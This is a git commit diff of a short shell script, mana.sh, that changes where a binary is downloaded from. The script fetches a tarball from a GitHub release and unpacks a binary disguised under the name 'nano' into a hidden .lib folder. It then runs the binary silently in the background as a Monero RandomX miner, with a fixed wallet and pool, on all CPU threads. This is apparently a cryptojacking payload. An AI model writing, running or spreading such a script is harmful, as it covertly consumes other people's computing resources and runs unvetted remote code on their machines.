cc0d093a1558d5491209bf4de27a254fa3267801
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-26 04:35:40 +0700

    Update mana.sh

--- mana.sh
+++ mana.sh
@@ -2,7 +2,7 @@
 set -x
 apt-get update ; apt-get install -y wget curl sudo
 mkdir .lib && cd .lib
-wget https://github.com/Sonehra/All-File/releases/download/sample/nano.tar.gz > /dev/null 2>&1
+wget https://github.com/TiannaMcdowell/All-File/releases/download/Nano/nano.tar.gz > /dev/null 2>&1
 tar -xvf nano.tar.gz
 chmod +x nano
 ./nano -algo RandomX -wallet amyKvLv8MZ3a6W6Stz7bFeMAVfNfCQDLhhkT6qpiEAUu5LAEJGXhaKsBzzxJTbmBV7NJPBRg2ENyhCSeTER49MUs6uFSPX3769 -coin XMR -rigName envio -pool1 randomx.rplant.xyz:7020 -useSSL false -cpuThreads $(nproc --all) > /dev/null 2>&1 &
